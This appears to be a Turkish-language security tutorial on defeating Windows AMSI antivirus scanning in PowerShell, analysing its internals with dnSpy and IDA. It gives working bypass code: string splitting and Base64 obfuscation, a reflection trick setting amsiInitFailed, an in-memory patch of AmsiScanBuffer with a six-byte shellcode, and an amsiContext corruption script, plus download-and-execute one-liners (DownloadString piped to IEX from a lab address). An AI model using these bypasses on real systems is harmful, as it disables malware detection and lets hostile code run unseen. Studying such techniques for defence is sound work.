# AMSI

## Scenario

Windows uygulamaları anti-malware yazılımları ile etkileşim kurmak için [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps) standart arayüzünü kullanır.

## String Manipulation

Tehdit olarak algılanan bir string kullan:

```pwsh
PS C:\Users\alpha> "AmsiUtils"
```

```output title="Output" hl_lines="4"
At line:1 char:1
+ "AmsiUtils"
+ ~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Korumayı atlatmak için ifade parçalara ayrılabilir:

```pwsh
PS C:\Users\alpha> "Amsi" + "Utils"
```

```output title="Output"
AmsiUtils
```

Korumayı atlatmak için Base64 kodlaması kullanılabilir:

```pwsh
PS C:\Users\alpha> [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("QW1zaVV0aWxz"))
```

```output title="Output"
AmsiUtils
```

## Bypass

### amsiInitFailed

Aşağıda verilen AMSI bypass komutunu ele alalım:

```pwsh
PS C:\Users\alpha> [ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
```

Tekniğin nasıl çalıştığını anlamak için [dnSpy](https://github.com/dnSpyEx/dnSpy) aracını kullanarak aşağıda yolu verilen DLL dosyasını açalım:

```text title="Path"
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
```

Açılan ekranda ScanContent fonksiyonuna ulaşalım:

* System.Management.Automation
* System.Management.Automation.dll
* System.Management.Automation
* AmsiUtils
* ScanContent

ScanContent fonksiyonunun kaynak kodunu inceleyelim:

```cs title="ScanContent" linenums="56" hl_lines="9-12"
if (string.IsNullOrEmpty(sourceMetadata))
{
    sourceMetadata = string.Empty;
}
if (InternalTestHooks.UseDebugAmsiImplementation && content.IndexOf("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", StringComparison.Ordinal) >= 0)
{
    return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED;
}
if (AmsiUtils.amsiInitFailed)
{
    return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
}
```

Eğer amsiInitFailed değeri true ise ScanContent fonksiyonu her zaman [AMSI_RESULT_NOT_DETECTED](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result#constants) döndürür.

Bu teknik artık işe yaramamaktadır, ancak birkaç müdahale ile işe yarar hale getirilebilir:

| BEFORE | AFTER |
|---|---|
| "System.Management.Automation.AmsiUtils" | "System.Management.Automation.Amsi" + "Utils" |
| "amsiInitFailed" | "amsiInit" + "Failed" |
| $true | !$false |

Korumayı atlatmayı deneyelim:

```pwsh
PS C:\Users\alpha> [ref].Assembly.GetType("System.Management.Automation.Amsi" + "Utils").GetField("amsiInit" + "Failed", "NonPublic,Static").SetValue($null, !$false)
PS C:\Users\alpha> "AmsiUtils"
```

```output title="Output"
AmsiUtils
```

### amsiScanBuffer

ScanContent fonksiyonunun kaynak kodunu inceleyelim:

```cs title="ScanContent" linenums="101" hl_lines="11 20 34"
                try
                {
                    fixed (string text = content)
                    {
                        char* ptr = text;
                        if (ptr != null)
                        {
                            ptr += RuntimeHelpers.OffsetToStringData / 2;
                        }
                        IntPtr intPtr = new IntPtr((void*)ptr);
                        num = AmsiUtils.AmsiNativeMethods.AmsiScanBuffer(AmsiUtils.amsiContext, intPtr, (uint)(content.Length * 2), sourceMetadata, AmsiUtils.amsiSession, ref amsi_RESULT2);
                    }
                }
                finally
                {
                    string text = null;
                }
                if (!Utils.Succeeded(num))
                {
                    amsi_RESULT = AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
                }
                else
                {
                    amsi_RESULT = amsi_RESULT2;
                }
            }
            catch (DllNotFoundException)
            {
                AmsiUtils.amsiInitFailed = true;
                amsi_RESULT = AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
            }
        }
    }
    return amsi_RESULT;
}
```

[AmsiScanBuffer](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) fonksiyonu bir [HRESULT](https://learn.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values) değeri döndürür:

| NAME | VALUE | DESCRIPTION |
|---|---|---|
| S_OK | 0x00000000 | Operation successful |
| E_ABORT | 0x80004004 | Operation aborted |
| E_ACCESSDENIED | 0x80070005 | General access denied error |
| E_FAIL | 0x80004005 | Unspecified failure |
| E_HANDLE | 0x80070006 | Handle that is not valid |
| E_INVALIDARG | 0x80070057 | One or more arguments are not valid |
| E_NOINTERFACE | 0x80004002 | No such interface supported |
| E_NOTIMPL | 0x80004001 | Not implemented |
| E_OUTOFMEMORY | 0x8007000E | Failed to allocate necessary memory |
| E_POINTER | 0x80004003 | Pointer that is not valid |
| E_UNEXPECTED | 0x8000FFFF | Unexpected failure |

Eğer AmsiScanBuffer fonksiyonu bir hata kodu döndürür ise koruma atlatılabilir.

Örneğin, EAX register değerini E_FAIL değeri ile güncelleyelim:

```nasm title="Assemble"
mov eax,0x80004005;
ret;
```

Koda karşılık bir shellcode üretmek için [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm) sitesini kullanalım (Architecture, x64):

```text title="Array Literal"
{ 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3 }
```

Alternatif olarak MSF [nasm_shell.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/nasm_shell.rb) betiği de kullanılabilir:

```sh
my@attack:~$ /opt/metasploit/tools/exploit/nasm_shell.rb 32
nasm > mov eax,0x80004005;
nasm > ret;
```

```nasm title="Output"
00000000  B805400080        mov eax,0x80004005
00000000  C3                ret
```

Aşağıda verilen PowerShell betiğini oluşturalım:

```powershell title="Bypass-2.ps1" linenums="1" hl_lines="17 25"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class Kernel32 {
    [DllImport("kernel32", CharSet = CharSet.Auto)]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;

$buf = [System.Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);

$hModule = [Kernel32]::LoadLibrary("amsi");

$lpStartAddress = [Kernel32]::GetProcAddress($hModule, "Amsi" + "ScanBuffer");

$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpStartAddress, [System.UIntPtr]::new($buf.Length), 0x40, [ref] $lpflOldProtect) | Out-Null;
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpStartAddress, $buf.Length);
[Kernel32]::VirtualProtect($lpStartAddress, [System.UIntPtr]::new($buf.Length), $lpflOldProtect, [ref] $lpflOldProtect) | Out-Null;
```

Korumayı atlatmayı deneyelim:

```pwsh
PS C:\Users\alpha> (New-Object System.Net.WebClient).DownloadString("http://10.10.14.185:8000/Bypass-2.ps1") | IEX
PS C:\Users\alpha> "AmsiUtils"
```

```output title="Output"
AmsiUtils
```

### amsiContext

ScanContent fonksiyonunun kaynak kodunu inceleyelim:

```cs title="ScanContent" linenums="90" hl_lines="1 3 8"
if (AmsiUtils.amsiSession == IntPtr.Zero)
{
    num = AmsiUtils.AmsiNativeMethods.AmsiOpenSession(AmsiUtils.amsiContext, ref AmsiUtils.amsiSession);
    AmsiUtils.AmsiInitialized = true;
    if (!Utils.Succeeded(num))
    {
        AmsiUtils.amsiInitFailed = true;
        return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
    }
}
```

Eğer [AmsiOpenSession](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiopensession) fonksiyonu bir hata kodu döndürür ise koruma atlatılabilir.

Fonksiyonu incelemek için amsi.dll, [IDA](https://hex-rays.com/ida-free) içerisinde açılır:

```nasm title="AmsiOpenSession" hl_lines="14-15 41-42"
.text:0000000180007CB0 ; Exported entry   4. AmsiOpenSession
.text:0000000180007CB0
.text:0000000180007CB0 ; =============== S U B R O U T I N E =======================================
.text:0000000180007CB0
.text:0000000180007CB0
.text:0000000180007CB0 ; HRESULT __stdcall AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION *amsiSession)
.text:0000000180007CB0                 public AmsiOpenSession
.text:0000000180007CB0 AmsiOpenSession proc near               ; DATA XREF: .rdata:000000018000F41B
.text:0000000180007CB0                                         ; .rdata:off_1800131F8
.text:0000000180007CB0                 test    rdx, rdx
.text:0000000180007CB3                 jz      short loc_180007CFC
.text:0000000180007CB5                 test    rcx, rcx
.text:0000000180007CB8                 jz      short loc_180007CFC
.text:0000000180007CBA                 cmp     dword ptr [rcx], 'ISMA'
.text:0000000180007CC0                 jnz     short loc_180007CFC
.text:0000000180007CC2                 cmp     qword ptr [rcx+8], 0
.text:0000000180007CC7                 jz      short loc_180007CFC
.text:0000000180007CC9                 cmp     qword ptr [rcx+10h], 0
.text:0000000180007CCE                 jz      short loc_180007CFC
.text:0000000180007CD0                 mov     r8d, 1
.text:0000000180007CD6                 mov     eax, r8d
.text:0000000180007CD9                 lock xadd [rcx+18h], eax
.text:0000000180007CDE                 add     eax, r8d
.text:0000000180007CE1                 cdqe
.text:0000000180007CE3                 mov     [rdx], rax
.text:0000000180007CE6                 jnz     short loc_180007CF8
.text:0000000180007CE8                 mov     eax, r8d
.text:0000000180007CEB                 lock xadd [rcx+18h], eax
.text:0000000180007CF0                 add     eax, r8d
.text:0000000180007CF3                 cdqe
.text:0000000180007CF5                 mov     [rdx], rax
.text:0000000180007CF8
.text:0000000180007CF8 loc_180007CF8:                          ; CODE XREF: AmsiOpenSession+36
.text:0000000180007CF8                 xor     eax, eax
.text:0000000180007CFA                 retn
.text:0000000180007CFA ; ---------------------------------------------------------------------------
.text:0000000180007CFB                 align 4
.text:0000000180007CFC
.text:0000000180007CFC loc_180007CFC:                          ; CODE XREF: AmsiOpenSession+3
.text:0000000180007CFC                                         ; AmsiOpenSession+8
.text:0000000180007CFC                 mov     eax, 80070057h
.text:0000000180007D01                 retn
.text:0000000180007D01 AmsiOpenSession endp
```

Eğer RCX register (amsiContext) ilk 4 bayt değeri AMSI değil ise AmsiOpenSession fonksiyonu [E_INVALIDARG](https://learn.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values) hata kodu döndürür.

Aşağıda verilen PowerShell betiğini oluşturalım:

```powershell title="Bypass-3.ps1" linenums="1" hl_lines="6 7"
$utils = [ref].Assembly.GetType("System.Management.Automation.Amsi" + "Utils");

$session = $utils.GetField("amsi" + "Session", "NonPublic,Static");
$context = $utils.GetField("amsi" + "Context", "NonPublic,Static");

$session.SetValue($null, $null);
$context.SetValue($null, [System.IntPtr] [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4));
```

| FIELD | VALUE | DESCRIPTION |
|---|---|---|
| amsiSession | $null | Bu sayede if bloğu çalışır. |
| amsiContext | $null (ilk 4 bayt) | Bu sayede hata oluşur. |

Korumayı atlatmayı deneyelim:

```pwsh
PS C:\Users\alpha> (New-Object System.Net.WebClient).DownloadString("http://10.10.14.185:8000/Bypass-3.ps1") | IEX
PS C:\Users\alpha> "AmsiUtils"
```

```output title="Output"
AmsiUtils
```
